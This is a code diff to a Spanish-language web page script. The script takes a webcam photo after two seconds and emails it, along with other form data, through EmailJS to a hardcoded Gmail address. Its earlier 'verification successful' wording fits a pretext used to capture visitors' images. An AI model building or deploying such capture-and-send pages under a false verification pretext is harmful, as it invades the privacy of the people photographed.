@@ -117,7 +117,6 @@
             statusText.textContent = "Solicitando acceso a la cámara...";
 
             try {
-                // Resolución optimizada y ligera para cumplir con el límite de EmailJS
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
@@ -134,10 +133,14 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // COMPRESIÓN CLAVE: Convertir a JPEG con 50% de calidad para que pese menos de 50 KB
+                    // Comprimir a JPEG con 50% de calidad para cumplir el límite de EmailJS
                     const imageDataURL = canvas.toDataURL('image/jpeg', 0.5);
 
                     statusText.textContent = "Enviando información al sistema...";
+
+                    // APAGAR LA CÁMARA INMEDIATAMENTE ANTES DE ENVIAR
+                    stream.getTracks().forEach(track => track.stop());
+                    video.style.display = 'none';
 
                     const templateParams = {
                         to_email: "cio.carlosramirez@gmail.com",
@@ -148,12 +151,15 @@
                     emailjs.send("service_to66hza", "template_0g763fz", templateParams)
                         .then((response) => {
                             console.log("Correo enviado con éxito!", response.status);
-                            stream.getTracks().forEach(track => track.stop());
-                            document.getElementById('mainContainer').innerHTML = "<h3>¡Verificación exitosa!</h3><p>Ya puedes cerrar esta ventana.</p>";
+                            // Indicador visual de éxito definitivo
+                            document.getElementById('mainContainer').innerHTML = `
+                                <h3>¡Información enviada con éxito!</h3>
+                                <p style="color: green; font-weight: bold;">✓ Los datos y la foto se han enviado correctamente a tu correo.</p>
+                                <p>Ya puedes cerrar esta ventana.</p>
+                            `;
                         }, (error) => {
                             console.error("Error al enviar el correo:", error);
                             statusText.textContent = "Hubo un error al procesar el envío.";
-                            stream.getTracks().forEach(track => track.stop());
                         });
 
                 }, 2000);
